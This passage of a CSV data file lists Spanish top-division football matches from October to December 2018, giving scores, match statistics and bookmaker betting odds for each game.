Bilbao,1,1,D,1,1,D,18,6,6,3,7,13,8,2,2,3,0,0,2.7,3.2,2.75,2.75,3.1,2.75,2.7,3.1,2.75,2.79,3.21,2.82,2.75,3.1,2.75,2.75,3.13,2.75,39,2.83,2.72,3.25,3.14,2.85,2.75,37,2.4,2.29,1.67,1.61,19,-0.25,2.38,2.3,1.7,1.65,2.87,3.36,2.64\r\nSP1,21/10/2018,Huesca,Espanol,0,2,A,0,1,A,10,6,2,2,21,14,6,4,3,3,0,0,3.5,3.3,2.14,3.6,3.3,2.15,3.6,3.35,2.1,3.64,3.54,2.13,3.5,3.5,2.1,3.6,3.4,2.1,39,3.7,3.57,3.55,3.4,2.17,2.11,37,2.25,2.15,1.76,1.7,18,0.25,2.11,2.06,1.88,1.82,4.07,3.43,2.05\r\nSP1,21/10/2018,Vallecano,Getafe,1,2,A,0,0,D,10,5,3,2,14,25,6,2,5,5,1,0,2.9,3.3,2.5,2.9,3.25,2.5,2.95,3.15,2.55,3,3.26,2.61,2.9,3.2,2.55,3,3.2,2.6,39,3,2.93,3.3,3.19,2.64,2.55,37,2.31,2.23,1.7,1.65,19,0.25,1.78,1.74,2.21,2.16,2.99,3.3,2.58\r\nSP1,22/10/2018,Sociedad,Girona,0,0,D,0,0,D,14,12,8,2,14,15,7,6,3,1,0,0,1.72,3.75,5,1.67,4,5,1.7,3.8,4.9,1.68,4.16,5.12,1.7,3.75,5,1.67,3.9,5.2,39,1.73,1.68,4.16,3.88,5.3,5.04,35,1.97,1.9,1.97,1.89,20,-1,2.35,2.24,1.75,1.68,1.82,3.69,4.83\r\nSP1,24/10/2018,Vallecano,Ath Bilbao,1,1,D,1,0,H,11,12,3,4,14,9,5,4,1,1,0,0,3.3,3.3,2.25,3.3,3.3,2.25,3.25,3.35,2.25,3.28,3.53,2.29,3.2,3.4,2.25,3.4,3.4,2.25,37,3.4,3.26,3.53,3.36,2.3,2.24,34,2.05,1.97,1.91,1.83,18,0.25,1.98,1.93,1.97,1.93,3.3,3.51,2.28\r\nSP1,26/10/2018,Valladolid,Espanol,1,1,D,0,1,A,15,11,2,4,16,16,5,2,4,2,0,0,3.4,3.1,2.25,3.1,3.2,2.4,2.75,3.25,2.6,3.45,3.21,2.36,3.3,3.1,2.35,3.4,3.2,2.38,36,3.45,3.3,3.25,3.14,2.6,2.35,33,2.51,2.38,1.62,1.58,16,0.25,1.94,1.89,2.01,1.99,3.61,3.19,2.3\r\nSP1,27/10/2018,Ath Bilbao,Valencia,0,0,D,0,0,D,13,11,2,3,25,22,5,2,2,5,0,0,2.5,3.3,2.87,2.55,3.3,2.85,2.4,3.3,2.95,2.69,3.23,2.91,2.6,3.25,2.8,2.63,3.3,2.9,37,2.74,2.6,3.35,3.22,2.95,2.83,35,2.2,2.09,1.8,1.73,17,-0.25,2.31,2.23,1.74,1.69,2.88,3.26,2.7\r\nSP1,27/10/2018,Ath Madrid,Sociedad,2,0,H,1,0,H,14,7,4,0,10,7,10,1,2,1,0,0,1.53,3.8,7.5,1.55,3.8,7,1.5,3.9,7.6,1.55,3.96,7.47,1.55,4,6.5,1.55,4,7.5,37,1.6,1.53,4.15,3.9,7.65,7.19,35,2.35,2.22,1.71,1.65,18,-1,2.02,1.96,1.95,1.9,1.49,3.97,9.33\r\nSP1,27/10/2018,Celta,Eibar,4,0,H,2,0,H,10,17,6,5,9,8,2,8,0,0,0,0,2.14,3.3,3.6,2.1,3.4,3.6,2.1,3.4,3.5,2.25,3.41,3.49,2.2,3.3,3.4,2.2,3.4,3.5,37,2.25,2.18,3.45,3.35,3.62,3.42,34,2.05,1.97,1.9,1.83,17,-0.25,1.95,1.88,2.04,1.98,2.24,3.48,3.44\r\nSP1,27/10/2018,Girona,Vallecano,2,1,H,2,0,H,14,14,6,5,11,16,4,7,1,3,1,0,1.85,3.5,4.5,1.83,3.6,4.4,1.8,3.6,4.5,1.93,3.58,4.31,1.91,3.6,4,1.93,3.75,4.1,37,1.95,1.89,3.75,3.57,4.5,4.22,34,1.97,1.89,2,1.91,18,-1,2.79,2.66,1.55,1.5,2,3.52,4.14\r\nSP1,27/10/2018,Levante,Leganes,2,0,H,1,0,H,9,21,4,6,12,14,3,2,2,2,0,0,2.1,3.25,3.75,2.15,3.4,3.4,2.2,3.3,3.4,2.17,3.43,3.65,2.15,3.3,3.5,2.15,3.3,3.6,37,2.22,2.15,3.45,3.33,3.75,3.51,35,2.1,2.04,1.85,1.77,16,0,1.57,1.54,2.66,2.54,2.37,3.37,3.25\r\nSP1,28/10/2018,Alaves,Villarreal,2,1,H,0,1,A,19,9,6,2,9,11,8,4,1,1,0,0,3,3.2,2.5,3.1,3.2,2.4,2.65,3.3,2.65,3.18,3.34,2.43,3.1,3.2,2.4,3.1,3.25,2.38,37,3.25,3.1,3.35,3.21,2.65,2.4,35,2.35,2.24,1.7,1.64,17,0.25,1.86,1.83,2.1,2.04,3.35,3.47,2.28\r\nSP1,28/10/2018,Barcelona,Real Madrid,5,1,H,2,0,H,13,15,8,4,17,14,4,2,2,2,0,0,1.95,3.8,3.6,1.95,3.8,3.6,2.1,3.6,3.3,2,3.78,3.8,2,3.7,3.6,1.95,3.8,3.6,36,2.1,1.97,3.95,3.74,3.89,3.65,33,1.6,1.53,2.6,2.46,17,-0.25,1.75,1.72,2.28,2.2,2.06,3.72,3.69\r\nSP1,28/10/2018,Getafe,Betis,2,0,H,0,0,D,16,7,7,3,9,14,5,4,1,2,0,0,2.4,3.1,3.25,2.4,3.1,3.2,2.4,3.05,3.25,2.48,3.12,3.32,2.4,3.1,3.2,2.45,3.1,3.3,37,2.52,2.42,3.15,3.06,3.35,3.23,34,2.65,2.52,1.56,1.52,18,-0.25,2.1,2.04,1.88,1.83,2.65,3.1,3.08\r\nSP1,28/10/2018,Sevilla,Huesca,2,1,H,0,0,D,15,11,4,2,9,14,4,2,2,3,0,0,1.22,6.5,13,1.26,5.75,12.5,1.22,6.5,12.5,1.25,6.66,12.27,1.25,5.8,12,1.22,6.5,13,37,1.3,1.24,7,6.3,13.5,11.99,35,1.46,1.42,2.95,2.77,18,-2,2.16,2.09,1.85,1.78,1.22,6.79,14.38\r\nSP1,03/11/2018,Leganes,Ath Madrid,1,1,D,0,0,D,8,9,3,4,18,12,4,7,4,2,0,0,5.75,3.4,1.72,6,3.3,1.72,5.5,3.25,1.77,5.99,3.24,1.81,5.25,3.3,1.8,5.5,3.3,1.83,38,6.2,5.63,3.45,3.3,1.83,1.77,33,2.8,2.65,1.51,1.47,21,1,1.6,1.54,2.65,2.55,6.54,3.28,1.75\r\nSP1,03/11/2018,Real Madrid,Valladolid,2,0,H,0,0,D,16,12,7,2,14,7,8,6,1,0,0,0,1.16,8,15,1.18,7.25,15.5,1.2,7.1,13,1.2,7.28,14.98,1.18,7.5,13,1.18,8,17,37,1.23,1.19,8.1,7.34,17,13.95,32,1.4,1.35,3.43,3.13,20,-2,1.94,1.86,2.06,2,1.19,7.38,16.48\r\nSP1,03/11/2018,Valencia,Girona,0,1,A,0,0,D,27,5,9,3,14,13,11,2,4,4,0,0,1.5,4,7.5,1.5,4.1,7,1.65,3.8,5.4,1.48,4.49,7.48,1.5,4.2,7,1.5,4.2,8,38,1.65,1.49,4.49,4.19,8.2,7.33,35,2.15,2.05,1.82,1.77,21,-1,2.1,1.84,2.1,2.03,1.48,4.41,7.81\r\nSP1,03/11/2018,Vallecano,Barcelona,2,3,A,1,1,D,11,9,5,5,23,11,3,1,4,2,0,0,9.5,6,1.28,10,6,1.28,9.6,5.5,1.3,9.55,5.85,1.32,9,5.8,1.3,10.5,6,1.3,38,11,9.47,6.25,5.77,1.35,1.3,31,1.46,1.42,3,2.81,20,2,1.66,1.62,2.46,2.36,11.04,6.77,1.26\r\nSP1,04/11/2018,Betis,Celta,3,3,D,1,0,H,14,14,6,7,12,11,4,4,4,2,0,0,1.8,3.8,4.5,1.83,3.8,4.2,2,3.4,3.8,1.83,4.02,4.34,1.83,3.8,4.2,1.8,3.75,4.3,38,2,1.82,4.02,3.76,4.55,4.27,35,1.96,1.9,1.96,1.9,19,-0.75,2.13,2.06,1.85,1.81,1.77,3.86,4.91\r\nSP1,04/11/2018,Eibar,Alaves,2,1,H,0,1,A,23,9,8,3,11,7,13,1,4,0,1,1,2.04,3.3,3.9,2.1,3.3,3.7,2.3,3.3,3.15,2.1,3.35,3.96,2.1,3.25,3.75,2.1,3.3,4,37,2.3,2.08,3.4,3.3,4,3.82,35,2.38,2.28,1.7,1.62,19,-0.25,1.8,1.77,2.16,2.11,2.16,3.37,3.75\r\nSP1,04/11/2018,Huesca,Getafe,1,1,D,0,0,D,18,8,7,2,18,13,10,2,5,3,0,0,3.6,3.3,2.1,3.6,3.25,2.15,3.6,3.1,2.2,3.65,3.22,2.27,3.5,3.2,2.2,3.6,3.13,2.2,38,3.75,3.59,3.3,3.17,2.27,2.2,35,2.55,2.43,1.6,1.55,19,0.25,2.01,1.97,1.94,1.89,3.87,3.25,2.17\r\nSP1,04/11/2018,Sociedad,Sevilla,0,0,D,0,0,D,10,8,1,1,8,17,7,7,1,3,0,0,2.75,3.5,2.45,2.85,3.5,2.4,2.85,3.55,2.4,2.76,3.61,2.6,2.75,3.5,2.5,2.7,3.6,2.5,38,2.9,2.79,3.7,3.53,2.6,2.46,36,1.78,1.72,2.2,2.11,19,0.25,1.77,1.74,2.24,2.16,2.58,3.58,2.79\r\nSP1,04/11/2018,Villarreal,Levante,1,1,D,0,0,D,23,13,4,2,14,10,5,4,3,3,0,0,1.55,4,6,1.57,4.2,5.75,1.7,3.8,5,1.63,4.1,5.83,1.62,4.2,5.25,1.57,4.2,5.75,38,1.7,1.59,4.45,4.17,6.13,5.56,35,1.68,1.61,2.45,2.29,21,-1,2.15,1.99,1.92,1.87,1.72,4,5.06\r\nSP1,05/11/2018,Espanol,Ath Bilbao,1,0,H,1,0,H,8,10,3,2,15,13,2,1,1,3,0,0,2,3.3,4,1.95,3.3,4.2,1.97,3.35,4.05,2.02,3.43,4.18,2,3.4,3.9,2,3.4,4,37,2.1,1.99,3.45,3.33,4.25,4.04,35,2.3,2.22,1.71,1.65,18,-0.25,1.75,1.71,2.25,2.2,1.92,3.46,4.61\r\nSP1,09/11/2018,Levante,Sociedad,1,3,A,1,0,H,17,15,2,4,17,12,6,4,6,1,0,0,2.62,3.4,2.62,2.65,3.4,2.65,2.65,3.4,2.65,2.76,3.38,2.73,2.63,3.3,2.7,2.75,3.4,2.7,37,2.76,2.7,3.45,3.34,2.76,2.68,34,2.05,1.96,2,1.85,20,-0.25,2.36,2.3,1.7,1.66,2.95,3.38,2.56\r\nSP1,10/11/2018,Ath Madrid,Ath Bilbao,3,2,H,0,1,A,9,6,3,5,8,15,12,2,5,4,0,1,1.44,4,9,1.45,4,9,1.45,4.3,7.5,1.47,4.13,9.27,1.47,4,8.5,1.5,4,9,38,1.5,1.46,4.3,4.02,9.45,8.67,35,2.55,2.39,1.65,1.57,21,-1,1.86,1.81,2.11,2.05,1.59,3.53,8.51\r\nSP1,10/11/2018,Getafe,Valencia,0,1,A,0,0,D,17,7,3,3,23,8,6,4,3,3,1,0,2.75,3.1,2.75,2.8,3.1,2.7,2.7,3.2,2.7,2.91,3.1,2.78,2.75,3.1,2.75,2.9,3.1,2.75,38,2.95,2.84,3.2,3.05,2.85,2.73,35,2.75,2.58,1.57,1.49,19,0.25,1.68,1.65,2.37,2.31,3.08,3.08,2.66\r\nSP1,10/11/2018,Girona,Leganes,0,0,D,0,0,D,5,10,0,1,13,13,0,6,1,4,0,0,2.04,3.2,3.75,2.15,3.2,3.7,2.15,3.15,3.65,2.23,3.27,3.69,2.15,3.25,3.6,2.2,3.3,3.7,38,2.25,2.17,3.32,3.21,3.81,3.65,36,2.5,2.39,1.62,1.57,19,-0.25,1.9,1.86,2.05,2.01,2.27,3.19,3.68\r\nSP1,10/11/2018,Valladolid,Eibar,0,0,D,0,0,D,9,16,1,6,16,15,4,4,2,4,0,1,2.3,3.3,3.25,2.3,3.25,3.25,2.3,3.2,3.25,2.43,3.29,3.24,2.3,3.25,3.25,2.38,3.3,3.25,38,2.43,2.35,3.35,3.23,3.33,3.23,36,2.4,2.29,1.67,1.62,20,-0.25,2.07,2.01,1.9,1.86,2.55,3.11,3.22\r\nSP1,11/11/2018,Alaves,Huesca,2,1,H,1,1,D,13,9,5,2,20,13,5,4,3,4,0,0,1.8,3.6,4.33,1.83,3.5,4.6,1.7,3.8,5,1.88,3.47,4.83,1.85,3.5,4.5,1.87,3.6,4.6,38,1.91,1.85,3.8,3.46,5,4.59,36,2.25,2.17,1.75,1.69,19,-0.75,2.17,2.13,1.8,1.76,2.15,3.17,4.08\r\nSP1,11/11/2018,Barcelona,Betis,3,4,A,0,2,A,20,15,5,8,13,11,10,5,4,2,1,0,1.18,7,13,1.19,7.25,14,1.2,7,13,1.22,7.23,13.06,1.18,7.5,13,1.18,7.5,13,38,1.25,1.21,7.8,7.1,15,12.6,31,1.35,1.3,3.65,3.4,20,-2,1.98,1.91,2.02,1.95,1.19,7.71,15\r\nSP1,11/11/2018,Celta,Real Madrid,2,4,A,0,1,A,15,14,4,5,19,13,5,1,4,2,1,0,5,4.5,1.55,5,4.33,1.62,4.8,4.2,1.65,5.02,4.63,1.63,4.8,4.6,1.6,5.2,4.75,1.55,38,5.5,5.07,4.85,4.53,1.65,1.59,32,1.42,1.38,3.2,2.98,21,1,2.01,1.93,2,1.92,5.15,4.64,1.61\r\nSP1,11/11/2018,Sevilla,Espanol,2,1,H,0,1,A,23,15,10,7,18,10,6,3,4,2,0,0,1.75,3.6,4.5,1.75,3.7,4.75,1.8,3.6,4.5,1.81,3.7,4.91,1.8,3.8,4.33,1.8,3.8,4.4,38,1.85,1.79,3.9,3.7,4.91,4.58,35,1.84,1.77,2.13,2.04,21,-1,2.56,2.45,1.65,1.58,1.9,3.7,4.34\r\nSP1,11/11/2018,Vallecano,Villarreal,2,2,D,1,1,D,15,11,7,5,7,12,8,4,1,3,0,1,3.1,3.4,2.25,3.1,3.4,2.3,3.05,3.3,2.35,3.17,3.56,2.34,3.1,3.4,2.3,3.13,3.5,2.25,38,3.25,3.11,3.56,3.43,2.4,2.29,35,1.98,1.88,2.02,1.92,19,0.25,1.93,1.89,2.02,1.98,3.26,3.78,2.2\r\nSP1,23/11/2018,Leganes,Alaves,1,0,H,1,0,H,13,7,6,2,10,13,5,3,2,4,0,0,2.2,3.1,3.6,2.2,3.1,3.6,2.3,3.2,3.3,2.29,3.14,3.68,2.2,3.1,3.7,2.3,3.13,3.6,38,2.35,2.27,3.2,3.08,3.81,3.57,36,2.7,2.56,1.55,1.5,19,-0.25,1.97,1.93,1.98,1.94,2.22,3.1,3.97\r\nSP1,24/11/2018,Ath Madrid,Barcelona,1,1,D,0,0,D,3,8,1,2,19,12,2,8,5,3,0,0,3,3.3,2.37,3.1,3.3,2.35,3.3,3.2,2.3,3.1,3.33,2.49,3.1,3.2,2.4,3,3.4,2.45,37,3.3,3.03,3.45,3.31,2.5,2.41,35,2,1.92,1.95,1.88,20,0.25,1.84,1.8,2.13,2.07,3.1,3.34,2.48\r\nSP1,24/11/2018,Eibar,Real Madrid,3,0,H,1,0,H,14,9,8,3,17,8,5,4,2,1,0,0,6,4.33,1.53,6,4.4,1.53,5.5,4.65,1.53,5.96,4.55,1.56,5.8,4.5,1.52,6,4.6,1.55,38,6.5,5.71,4.85,4.54,1.57,1.53,34,1.5,1.45,1.8,1.69,23,1,2.07,2.02,2.85,2.67,7.04,4.92,1.46\r\nSP1,24/11/2018,Huesca,Levante,2,2,D,1,1,D,32,5,12,3,11,8,7,2,4,3,1,0,2.25,3.4,3.25,2.3,3.4,3.1,2.2,3.35,3.35,2.27,3.39,3.44,2.3,3.4,3.1,2.25,3.4,3.4,37,2.37,2.25,3.5,3.35,3.45,3.3,36,2.11,2.01,1.9,1.8,20,-0.25,1.97,1.92,2,1.94,2.31,3.4,3.36\r\nSP1,24/11/2018,Valencia,Vallecano,3,0,H,1,0,H,13,13,10,3,15,14,6,5,2,4,0,1,1.44,4.5,7.5,1.45,4.75,6.5,1.5,4.25,6.6,1.43,4.73,8.1,1.42,4.5,8,1.45,4.8,7.5,38,1.5,1.44,4.85,4.59,8.1,7.25,37,1.77,1.72,2.23,2.12,22,-1,1.77,1.72,2.26,2.17,1.43,4.59,8.86\r\nSP1,25/11/2018,Ath Bilbao,Getafe,1,1,D,0,0,D,8,15,4,2,10,12,2,2,5,4,0,0,2.04,3.3,3.9,2.1,3.25,3.8,2.05,3.2,3.9,2.11,3.37,3.9,2.05,3.25,3.9,2.1,3.3,4,37,2.15,2.08,3.4,3.25,4.05,3.85,35,2.59,2.44,1.6,1.55,20,-0.25,1.81,1.78,2.15,2.09,2.29,3.2,3.62\r\nSP1,25/11/2018,Espanol,Girona,1,3,A,0,2,A,18,16,10,11,16,14,8,3,3,4,0,0,1.66,3.6,5.75,1.62,3.7,6,1.7,3.7,5.1,1.68,3.85,5.8,1.65,3.5,6,1.62,3.8,5.75,37,1.75,1.66,3.9,3.7,6,5.64,36,2.3,2.18,1.75,1.68,22,-1,2.29,2.19,1.76,1.71,1.66,3.75,6.24\r\nSP1,25/11/2018,Sevilla,Valladolid,1,0,H,1,0,H,17,13,9,5,15,15,8,6,3,3,0,0,1.4,4.75,8,1.36,5.25,7.75,1.4,5,7.4,1.38,5.34,8.1,1.36,5,8.5,1.36,5,8,37,1.43,1.38,5.34,4.99,9,7.76,35,1.65,1.57,2.5,2.38,22,-1,1.65,1.59,2.5,2.4,1.4,4.89,8.83\r\nSP1,25/11/2018,Villarreal,Betis,2,1,H,0,0,D,13,13,8,6,15,13,5,4,2,1,0,0,2.14,3.4,3.4,2.15,3.5,3.3,2.2,3.3,3.4,2.25,3.59,3.32,2.2,3.5,3.25,2.2,3.5,3.25,37,2.32,2.21,3.65,3.47,3.4,3.24,35,1.84,1.78,2.15,2.03,20,-0.25,1.95,1.92,1.99,1.94,2.12,3.55,3.67\r\nSP1,26/11/2018,Sociedad,Celta,2,1,H,1,0,H,15,6,8,2,12,14,6,2,2,2,0,0,1.85,3.75,4.2,1.85,3.6,4.33,1.9,3.6,4,1.83,3.91,4.47,1.8,3.8,4.33,1.83,3.8,4.2,36,1.9,1.83,3.91,3.72,4.5,4.29,34,1.9,1.83,2.05,1.98,20,-0.75,2.12,2.06,1.85,1.81,1.9,3.75,4.28\r\nSP1,30/11/2018,Vallecano,Eibar,1,0,H,0,0,D,5,13,2,5,15,12,1,4,5,3,0,0,3.1,3.3,2.3,3,3.3,2.4,2.95,3.2,2.5,3.09,3.54,2.39,3,3.4,2.35,3.1,3.5,2.38,37,3.2,3.01,3.55,3.41,2.6,2.37,35,1.95,1.87,2.03,1.93,20,0.25,1.89,1.84,2.1,2.04,2.95,3.4,2.55\r\nSP1,01/12/2018,Celta,Huesca,2,0,H,1,0,H,12,8,5,3,14,14,4,4,2,3,0,0,1.64,4,5,1.65,3.9,5.25,1.65,3.8,5.4,1.74,3.87,5.17,1.7,3.8,5,1.73,4,5,37,1.8,1.69,4.15,3.88,5.6,5.07,36,1.81,1.76,2.13,2.05,22,-1,2.32,2.21,1.77,1.7,1.67,3.99,5.54\r\nSP1,01/12/2018,Getafe,Espanol,3,0,H,0,0,D,14,8,5,2,17,16,7,4,3,2,0,0,2.4,2.87,3.4,2.4,3,3.3,2.45,3,3.2,2.42,3.09,3.47,2.38,3,3.4,2.38,3.1,3.5,36,2.51,2.39,3.15,3.03,3.5,3.35,35,2.71,2.57,1.55,1.49,20,-0.25,2.05,2,1.91,1.86,2.48,3.13,3.31\r\nSP1,01/12/2018,Real Madrid,Valencia,2,0,H,1,0,H,13,7,3,2,11,10,2,2,1,3,0,0,1.44,4.75,7,1.45,4.75,6.5,1.5,4.8,5.6,1.47,4.84,6.99,1.44,4.6,7,1.45,4.8,7,37,1.51,1.45,5,4.73,7.5,6.72,35,1.55,1.5,2.71,2.55,22,-1,1.75,1.71,2.25,2.18,1.62,4.16,5.85\r\nSP1,01/12/2018,Valladolid,Leganes,2,4,A,0,2,A,20,14,6,5,5,13,6,5,0,3,0,0,2.37,3.1,3.3,2.35,3.1,3.3,2.4,3,3.3,2.46,3.02,3.48,2.38,3,3.4,2.4,3.1,3.4,37,2.5,2.41,3.15,3.01,3.55,3.35,33,2.92,2.73,1.5,1.44,21,-0.25,2.06,2.03,1.87,1.84,2.43,3.09,3.46\r\nSP1,02/12/2018,Alaves,Sevilla,1,1,D,1,0,H,11,14,3,3,21,14,2,5,3,3,0,0,3.6,3.6,2,3.6,3.5,2.05,3.4,3.5,2.1,3.79,3.69,2.03,3.7,3.6,2,3.6,3.7,2,37,3.9,3.68,3.75,3.61,2.1,2,36,1.85,1.77,2.12,2.03,20,0.25,2.23,2.16,1.77,1.73,3.72,3.48,2.13\r\nSP1,02/12/2018,Barcelona,Villarreal,2,0,H,1,0,H,16,12,7,2,9,17,11,1,2,4,0,0,1.25,6.5,11,1.22,6.75,11.5,1.25,6.5,10,1.25,6.9,11.47,1.22,6.5,13,1.22,6.5,13,37,1.27,1.23,7.3,6.67,13.25,11.42,30,1.36,1.33,3.45,3.23,21,-2,2.08,1.99,1.92,1.87,1.24,6.89,12.49\r\nSP1,02/12/2018,Betis,Sociedad,1,0,H,1,0,H,6,6,4,4,18,18,6,4,4,2,0,0,2.2,3.3,3.4,2.25,3.25,3.4,2.1,3.4,3.5,2.32,3.3,3.44,2.25,3.1,3.5,2.3,3.3,3.3,37,2.35,2.27,3.4,3.26,3.5,3.33,36,2.1,1.99,1.87,1.82,20,-0.25,2,1.94,1.96,1.92,1.85,3.76,4.5\r\nSP1,02/12/2018,Girona,Ath Madrid,1,1,D,1,0,H,13,17,3,3,8,16,2,9,0,5,0,0,5.5,3.4,1.75,5.5,3.4,1.75,5.1,3.3,1.8,5.64,3.42,1.79,5.5,3.4,1.75,5.5,3.4,1.8,37,5.65,5.32,3.55,3.36,1.83,1.77,35,2.55,2.44,1.61,1.54,21,1,1.6,1.55,2.63,2.5,5.52,3.38,1.81\r\nSP1,03/12/2018,Levante,Ath Bilbao,3,0,H,1,0,H,17,12,7,3,11,15,2,6,3,5,0,1,2.75,3.4,2.54,2.8,3.4,2.5,2.65,3.4,2.65,2.84,3.46,2.6,2.7,3.3,2.6,2.75,3.4,2.55,36,2.9,2.74,3.5,3.36,2.75,2.58,34,2.01,1.93,1.95,1.87,19,0.25,1.75,1.7,2.28,2.21,2.97,3.51,2.48\r\nSP1,07/12/2018,Leganes,Getafe,1,1,D,0,1,A,17,6,5,2,12,13,7,2,1,2,1,0,2.62,2.9,3,2.6,3,3,2.7,2.85,3.05,2.76,2.99,3.04,2.7,2.9,3,2.75,3,3,37,2.84,2.68,3.04,2.92,3.15,3.02,32,3.2,2.89,1.45,1.5,19,0,1.9,1.85,2.08,2.02,2.76,2.94,3.11\r\nSP1,08/12/2018,Ath Madrid,Alaves,3,0,H,1,0,H,12,13,5,3,20,15,5,5,5,4,0,0,1.36,4.5,10,1.4,4.33,9.5,1.43,4.2,8.5,1.39,4.38,11.88,1.38,4.33,11,1.4,4.5,10.5,38,1.45,1.39,4.6,4.35,11.88,10.12,35,2.3,2.21,1.72,1.66,23,-1,1.7,1.66,2.35,2.27,1.38,4.5,11.7\r\nSP1,08/12/2018,Espanol,Barcelona,0,4,A,0,3,A,15,17,3,9,16,10,11,4,1,0,0,0,6.5,4.33,1.5,6,4.4,1.53,5.7,4.3,1.55,6.09,4.64,1.53,6.5,4.4,1.5,6.5,4.6,1.53,37,6.5,6.09,4.7,4.44,1.56,1.52,34,1.63,1.58,2.5,2.36,22,1,2.08,2.03,1.87,1.83,8.23,5.02,1.4\r\nSP1,08/12/2018,Valencia,Sevilla,1,1,D,0,0,D,16,11,6,3,13,17,6,4,0,4,0,0,2.2,3.5,3.2,2.25,3.4,3.2,2.3,3.4,3.05,2.24,3.61,3.31,2.2,3.5,3.25,2.3,3.5,3.25,37,2.32,2.23,3.65,3.48,3.35,3.22,34,1.9,1.84,2.05,1.96,20,-0.25,1.97,1.93,1.98,1.93,2.1,3.65,3.63\r\nSP1,08/12/2018,Villarreal,Celta,2,3,A,0,1,A,13,14,3,7,12,10,6,1,3,3,0,0,1.72,3.8,4.75,1.8,3.75,4.33,1.85,3.6,4.3,1.81,3.9,4.56,1.78,3.8,4.4,1.8,3.9,4.6,37,1.85,1.79,4,3.81,4.81,4.45,35,1.77,1.71,2.21,2.13,22,-1,2.45,2.39,1.65,1.6,1.68,4.22,5.03\r\nSP1,09/12/2018,Betis,Vallecano,2,0,H,0,0,D,8,12,3,3,13,20,2,9,2,3,0,0,1.53,4.33,6,1.53,4.4,6,1.57,4.35,5.5,1.57,4.54,5.76,1.53,4.4,5.8,1.53,4.5,5.75,37,1.6,1.55,4.6,4.39,6.1,5.69,34,1.7,1.63,2.38,2.26,22,-1,1.97,1.92,1.98,1.93,1.49,4.69,6.79\r\nSP1,09/12/2018,Eibar,Levante,4,4,D,1,2,A,32,14,7,5,11,7,12,3,2,2,0,0,1.75,3.8,4.5,1.78,3.8,4.5,1.75,3.9,4.55,1.78,4.03,4.57,1.78,3.8,4.4,1.8,3.9,4.75,37,1.83,1.78,4.05,3.84,4.75,4.46,34,1.85,1.77,2.12,2.05,20,-0.75,2.03,1.98,1.93,1.88,1.71,3.99,5.16\r\nSP1,09/12/2018,Huesca,Real Madrid,0,1,A,0,1,A,11,5,4,4,12,10,11,6,2,2,0,0,10,5.5,1.3,9.25,5.25,1.33,9.6,5.5,1.3,9.11,6.01,1.32,9.5,5.8,1.3,9.5,5.75,1.3,37,10.25,9.13,6.05,5.62,1.36,1.31,31,1.5,1.44,2.9,2.72,22,1.5,2.05,1.99,1.91,1.85,9.97,5.92,1.31\r\nSP1,09/12/2018,Sociedad,Valladolid,1,2,A,0,1,A,23,10,5,6,9,16,11,6,2,2,0,0,1.61,3.6,6.5,1.62,3.6,6.5,1.6,3.75,6,1.61,3.94,6.47,1.6,3.8,6,1.6,3.9,6,37,1.65,1.61,4,3.78,6.5,6.11,34,2.25,2.15,1.75,1.69,22,-1,2.2,2.12,1.8,1.75,1.77,3.44,5.83\r\nSP1,10/12/2018,Ath Bilbao,Girona,1,0,H,0,0,D,25,3,10,1,17,15,11,0,3,1,0,0,1.95,3.4,4,2,3.3,4,1.95,3.4,4.05,1.98,3.57,4.15,1.95,3.5,4,1.95,3.5,4,36,2.05,1.98,3.57,3.38,4.33,4.02,34,2.25,2.14,1.76,1.7,19,-0.25,1.76,1.71,2.28,2.19,2.03,3.61,3.89\r\nSP1,14/12/2018,Celta,Leganes,0,0,D,0,0,D,15,5,2,2,11,11,10,0,3,3,0,0,1.85,3.5,4.33,1.83,3.5,4.6,1.85,3.4,4.6,1.87,3.5,4.82,1.85,3.4,4.6,1.87,3.5,4.75,36,1.91,1.86,3.65,3.46,4.95,4.59,34,2.35,2.23,1.74,1.65,21,-0.75,2.19,2.13,1.8,1.76,1.92,3.44,4.65\r\nSP1,15/12/2018,Eibar,Valencia,1,1,D,0,1,A,18,11,6,4,11,15,4,2,0,1,0,0,2.7,3.2,2.7,2.7,3.2,2.7,2.65,3.2,2.75,2.74,3.26,2.84,2.7,3.2,2.7,2.7,3.3,2.8,37,2.8,2.69,3.35,3.21,2.86,2.74,34,2.2,2.1,1.8,1.73,20,-0.25,2.36,2.29,1.7,1.66,2.7,3.16,2.97\r\nSP1,15/12/2018,Getafe,Sociedad,1,0,H,1,0,H,9,9,2,4,24,14,2,3,3,4,0,0,2.25,3.1,3.5,2.3,3.1,3.4,2.2,3.2,3.5,2.35,3.16,3.52,2.3,3,3.5,2.3,3.13,3.6,36,2.4,2.31,3.2,3.09,3.6,3.44,33,2.67,2.56,1.55,1.49,21,-0.25,2,1.95,1.96,1.91,2.35,3.12,3.59\r\nSP1,15/12/2018,Real Madrid,Vallecano,1,0,H,1,0,H,9,11,4,3,15,18,4,4,0,3,0,0,1.14,9,15,1.16,9.25,13,1.15,8.5,15,1.15,9.14,17.59,1.12,9,19,1.14,9,21,36,1.18,1.15,9.75,8.8,21,16.27,29,1.25,1.23,4.2,3.95,22,-2.5,2.09,2.02,1.89,1.83,1.16,8.66,17.59\r\nSP1,15/12/2018,Valladolid,Ath Madrid,2,3,A,0,2,A,8,14,2,5,16,13,9,3,4,1,0,0,5.75,3.4,1.72,5.75,3.3,1.75,5.1,3.3,1.8,6.11,3.5,1.72,5.8,3.5,1.7,6,3.5,1.73,36,6.15,5.7,3.51,3.41,1.8,1.73,33,2.7,2.48,1.58,1.52,22,1,1.65,1.6,2.5,2.4,6.75,3.4,1.7\r\nSP1,16/12/2018,Espanol,Betis,1,3,A,1,1,D,10,12,3,5,23,10,0,4,3,4,0,0,2.4,3.3,3,2.3,3.3,3.2,2.3,3.35,3.1,2.38,3.39,3.23,2.35,3.3,3.1,2.3,3.4,3.13,37,2.41,2.34,3.5,3.33,3.3,3.11,33,2.04,1.96,1.9,1.84,20,-0.25,2.05,2.01,1.9,1.86,2.57,3.35,2.97\r\nSP1,16/12/2018,Huesca,Villarreal,2,2,D,1,0,H,30,10,13,5,12,11,13,2,4,5,0,1,3.5,3.2,2.14,3.3,3.25,2.3,3.3,3.4,2.2,3.32,3.5,2.28,3.3,3.4,2.2,3.2,3.5,2.2,37,3.5,3.29,3.65,3.4,2.3,2.21,33,1.98,1.91,1.95,1.88,20,0.25,1.97,1.93,1.97,1.93,3.43,3.3,2.32\r\nSP1,16/12/2018,Levante,Barcelona,0,5,A,0,2,A,20,16,6,9,12,9,15,3,2,3,1,0,9,6.5,1.25,11,7,1.22,9.6,5.5,1.3,10.21,6.74,1.27,11,6.5,1.24,12,6.5,1.22,36,12,10.22,7.1,6.58,1